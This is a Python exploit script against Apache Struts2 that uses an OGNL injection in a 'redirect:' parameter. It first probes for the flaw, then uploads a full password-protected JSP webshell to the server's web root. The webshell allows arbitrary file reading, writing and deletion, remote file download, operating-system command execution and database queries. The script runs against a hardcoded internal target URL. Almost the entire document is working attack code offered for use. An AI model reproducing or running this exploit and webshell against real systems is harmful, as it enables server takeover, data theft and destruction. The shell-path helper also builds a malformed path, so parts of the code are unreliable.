#coding=utf-8
import sys
import requests
class StrutsExploit():

	def __init__(self):
		self.webshell = '''<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%>
<%!
	String Pwd = "Cknife";
	String cs = "UTF-8";
	
	String EC(String s) throws Exception {
		return new String(s.getBytes("ISO-8859-1"),cs);
	}
	
	Connection GC(String s) throws Exception {
		String[] x = s.trim().split("choraheiheihei");
		Class.forName(x[0].trim());
		if(x[1].indexOf("jdbc:oracle")!=-1){
			return DriverManager.getConnection(x[1].trim()+":"+x[4],x[2].equalsIgnoreCase("[/null]")?"":x[2],x[3].equalsIgnoreCase("[/null]")?"":x[3]);
		}else{
			Connection c = DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase("[/null]")?"":x[2],x[3].equalsIgnoreCase("[/null]")?"":x[3]);
			if (x.length > 4) {
				c.setCatalog(x[4]);
			}
			return c;
		}
	}
	
	void AA(StringBuffer sb) throws Exception {
		File k = new File("");
		File r[] = k.listRoots();
		for (int i = 0; i < r.length; i++) {
			sb.append(r[i].toString().substring(0, 2));
		}
	}
	
	void BB(String s, StringBuffer sb) throws Exception {
		File oF = new File(s), l[] = oF.listFiles();
		String sT, sQ, sF = "";
		java.util.Date dt;
		SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		for (int i = 0; i < l.length; i++) {
			dt = new java.util.Date(l[i].lastModified());
			sT = fm.format(dt);
			sQ = l[i].canRead() ? "R" : "";
			sQ += l[i].canWrite() ? " W" : "";
			if (l[i].isDirectory()) {
				sb.append(l[i].getName() + "/\t" + sT + "\t" + l[i].length()+ "\t" + sQ + "\n");
			} else {
				sF+=l[i].getName() + "\t" + sT + "\t" + l[i].length() + "\t"+ sQ + "\n";
			}
		}
		sb.append(sF);
	}
	
	void EE(String s) throws Exception {
		File f = new File(s);
		if (f.isDirectory()) {
			File x[] = f.listFiles();
			for (int k = 0; k < x.length; k++) {
				if (!x[k].delete()) {
					EE(x[k].getPath());
				}
			}
		}
		f.delete();
	}
	
	void FF(String s, HttpServletResponse r) throws Exception {
		int n;
		byte[] b = new byte[512];
		r.reset();
		ServletOutputStream os = r.getOutputStream();
		BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));
		os.write(("->" + "|").getBytes(), 0, 3);
		while ((n = is.read(b, 0, 512)) != -1) {
			os.write(b, 0, n);
		}
		os.write(("|" + "<-").getBytes(), 0, 3);
		os.close();
		is.close();
	}
	
	void GG(String s, String d) throws Exception {
		String h = "0123456789ABCDEF";
		File f = new File(s);
		f.createNewFile();
		FileOutputStream os = new FileOutputStream(f);
		for (int i = 0; i < d.length(); i += 2) {
			os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i + 1))));
		}
		os.close();
	}
	
	void HH(String s, String d) throws Exception {
		File sf = new File(s), df = new File(d);
		if (sf.isDirectory()) {
			if (!df.exists()) {
				df.mkdir();
			}
			File z[] = sf.listFiles();
			for (int j = 0; j < z.length; j++) {
				HH(s + "/" + z[j].getName(), d + "/" + z[j].getName());
			}
		} else {
			FileInputStream is = new FileInputStream(sf);
			FileOutputStream os = new FileOutputStream(df);
			int n;
			byte[] b = new byte[512];
			while ((n = is.read(b, 0, 512)) != -1) {
				os.write(b, 0, n);
			}
			is.close();
			os.close();
		}
	}
	
	void II(String s, String d) throws Exception {
		File sf = new File(s), df = new File(d);
		sf.renameTo(df);
	}
	
	void JJ(String s) throws Exception {
		File f = new File(s);
		f.mkdir();
	}
	
	void KK(String s, String t) throws Exception {
		File f = new File(s);
		SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		java.util.Date dt = fm.parse(t);
		f.setLastModified(dt.getTime());
	}
	
	void LL(String s, String d) throws Exception {
		URL u = new URL(s);
		int n = 0;
		FileOutputStream os = new FileOutputStream(d);
		HttpURLConnection h = (HttpURLConnection) u.openConnection();
		InputStream is = h.getInputStream();
		byte[] b = new byte[512];
		while ((n = is.read(b)) != -1) {
			os.write(b, 0, n);
		}
		os.close();
		is.close();
		h.disconnect();
	}
	
	void MM(InputStream is, StringBuffer sb) throws Exception {
		String l;
		BufferedReader br = new BufferedReader(new InputStreamReader(is));
		while ((l = br.readLine()) != null) {
			sb.append(l + "\r\n");
		}
	}
	
	void NN(String s, StringBuffer sb) throws Exception {
		Connection c = GC(s);
		ResultSet r = s.indexOf("jdbc:oracle")!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();
		while (r.next()) {
			sb.append(r.getString(1) + "\t|\t\r\n");
		}
		r.close();
		c.close();
	}
	
	void OO(String s, StringBuffer sb) throws Exception {
		Connection c = GC(s);
		String[] x = s.trim().split("choraheiheihei");
		ResultSet r = c.getMetaData().getTables(null,s.indexOf("jdbc:oracle")!=-1?x.length>5?x[5]:x[4]:null, "%", new String[]{"TABLE"});
		while (r.next()) {
			sb.append(r.getString("TABLE_NAME") + "\t|\t\r\n");
		}
		r.close();
		c.close();
	}
	
	void PP(String s, StringBuffer sb) throws Exception {
		String[] x = s.trim().split("\r\n");
		Connection c = GC(s);
		Statement m = c.createStatement(1005, 1007);
		ResultSet r = m.executeQuery("select * from " + x[x.length-1]);
		ResultSetMetaData d = r.getMetaData();
		for (int i = 1; i <= d.getColumnCount(); i++) {
			sb.append(d.getColumnName(i) + " (" + d.getColumnTypeName(i)+ ")\t");
		}
		r.close();
		m.close();
		c.close();
	}
	
	void QQ(String cs, String s, String q, StringBuffer sb,String p) throws Exception {
		Connection c = GC(s);
		Statement m = c.createStatement(1005, 1008);
		BufferedWriter bw = null;
		try {
			ResultSet r = m.executeQuery(q.indexOf("--f:")!=-1?q.substring(0,q.indexOf("--f:")):q);
			ResultSetMetaData d = r.getMetaData();
			int n = d.getColumnCount();
			for (int i = 1; i <= n; i++) {
				sb.append(d.getColumnName(i) + "\t|\t");
			}
			sb.append("\r\n");
			if(q.indexOf("--f:")!=-1){
				File file = new File(p);
				if(q.indexOf("-to:")==-1){
					file.mkdir();
				}
				bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf("-to:")!=-1?p.trim():p+q.substring(q.indexOf("--f:") + 4,q.length()).trim()),true),cs));
			}
			while (r.next()) {
				for (int i = 1; i <= n; i++) {
					if(q.indexOf("--f:")!=-1){
						bw.write(r.getObject(i)+""+"\t");
						bw.flush();
					}else{
						sb.append(r.getObject(i)+"" + "\t|\t");
					}
				}
				if(bw!=null){bw.newLine();}
				sb.append("\r\n");
			}
			r.close();
			if(bw!=null){bw.close();}
		} catch (Exception e) {
			sb.append("Result\t|\t\r\n");
			try {
				m.executeUpdate(q);
				sb.append("Execute Successfully!\t|\t\r\n");
			} catch (Exception ee) {
				sb.append(ee.toString() + "\t|\t\r\n");
			}
		}
		m.close();
		c.close();
	}
%>
<%


//String Z = EC(request.getParameter(Pwd) + "", cs);
	
	cs = request.getParameter("code") != null ? request.getParameter("code")+ "":cs;
	request.setCharacterEncoding(cs);
	response.setContentType("text/html;charset=" + cs);
	StringBuffer sb = new StringBuffer("");
if (request.getParameter(Pwd) != null) {

	try {
		String Z = EC(request.getParameter("action") + "");
		String z1 = EC(request.getParameter("z1") + "");
		String z2 = EC(request.getParameter("z2") + "");
		sb.append("->" + "|");
		String s = request.getSession().getServletContext().getRealPath("/");
		if (Z.equals("A")) {
			sb.append(s + "\t");
			if (!s.substring(0, 1).equals("/")) {
				AA(sb);
			}
		} else if (Z.equals("B")) {
			BB(z1, sb);
		} else if (Z.equals("C")) {
			String l = "";
			BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));
			while ((l = br.readLine()) != null) {
				sb.append(l + "\r\n");
			}
			br.close();
		} else if (Z.equals("D")) {
			BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));
			bw.write(z2);
			bw.close();
			sb.append("1");
		} else if (Z.equals("E")) {
			EE(z1);
			sb.append("1");
		} else if (Z.equals("F")) {
			FF(z1, response);
		} else if (Z.equals("G")) {
			GG(z1, z2);
			sb.append("1");
		} else if (Z.equals("H")) {
			HH(z1, z2);
			sb.append("1");
		} else if (Z.equals("I")) {
			II(z1, z2);
			sb.append("1");
		} else if (Z.equals("J")) {
			JJ(z1);
			sb.append("1");
		} else if (Z.equals("K")) {
			KK(z1, z2);
			sb.append("1");
		} else if (Z.equals("L")) {
			LL(z1, z2);
			sb.append("1");
		} else if (Z.equals("M")) {
			String[] c = { z1.substring(2), z1.substring(0, 2), z2 };
			Process p = Runtime.getRuntime().exec(c);
			MM(p.getInputStream(), sb);
			MM(p.getErrorStream(), sb);
		} else if (Z.equals("N")) {
			NN(z1, sb);
		} else if (Z.equals("O")) {
			OO(z1, sb);
		} else if (Z.equals("P")) {
			PP(z1, sb);
		} else if (Z.equals("Q")) {
			QQ(cs, z1, z2, sb,z2.indexOf("-to:")!=-1?z2.substring(z2.indexOf("-to:")+4,z2.length()):s.replaceAll("\\\\", "/")+"images/");
		}
	} catch (Exception e) {
		sb.append("ERROR" + ":// " + e.toString());
	}
	sb.append("|" + "<-");
	out.print(sb.toString());
}
%>
'''
		self.payload = '''redirect:${%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3dfalse%2c%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%23context%5b%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22%5d%2c%23b%3dnew+java.io.FileOutputStream(new+java.lang.StringBuilder(%23a.getRealPath(%22/%22)).append(@java.io.File@separator).append(%22system.jsp%22))%2c%23b.write(%23a.getParameter("t").getBytes())%2c%23b.close%28%29%2c%23p%3d%23context%5b%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%5d.getWriter%28%29%2c%23p.println%28%22DONE%22%29%2c%23p.flush%28%29%2c%23p.close%28%29}'''
		self.detect_str = '''redirect:${%23p%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23p.println(%22HACKER%22),%23p.close()}'''

	'''获取shell的URL'''
	def getShellPath(self,url):
		rawurl = url
		count = 0
		i = 0
		lineIndex = []
		url = url.replace('http://','')
		for x in url:
			if x == '/':
				lineIndex.append(i)
				count += 1
			if count == 2:
				break
			i += 1
		if len(lineIndex) != 2:
			proDir = ''
			partOne = partOne = rawurl[0:lineIndex[0]+7]
		else:
			proDir = url[lineIndex[0]:lineIndex[1]]
			partOne = rawurl[0:lineIndex[0]+7]
		shellpath = "%s%s%s" % (partOne,proDir,"C:\Users\Administrator\Desktop\Cknife\succes.jsp")
		return shellpath


	'''检测是否存在漏洞'''
	def detect(self,url):
		url = "%s?%s" % (url,self.detect_str)
		try:
			r = requests.get(url,timeout=10)
			page_content = r.content
			if page_content.find('HACKER') != -1:
				return True
			else:
				return False
		except Exception, e:
			print '[+]Exploit Failed:',e
			return False

	'''攻击 上传shell到根目录'''
	def getshell(self,url):
		target_url = "%s?%s" % (url,self.payload)
		data = {'t':self.webshell}
		try:
			r = requests.post(target_url,data=data,timeout=10)
			page_content = r.content
			if page_content.find('DONE') != -1:
				print '[+]Exploit Success,shell location:\n%s' % self.getShellPath(url)
			else:
				print '[+]Exploit Failed'
		except Exception, e:
			print '[+]Exploit Failed:',e
			return

if __name__ == '__main__':

	url = "http://192.168.31.18:8088/wxzf_pre/shanxi/recharge!index.do"

	if not url.startswith('http://'):
		print '[+]URL is invalid!'
		sys.exit()
	print 'Powered By:Exploit\nQQ:739858341\n[:-)]Target:%s' % url
	attacker = StrutsExploit()
	if attacker.detect(url):
		print '[+]This website is vulnerable!'
	else:
		print '[+]Sorry,exploit failed!'
		sys.exit()
	attacker.getshell(url)
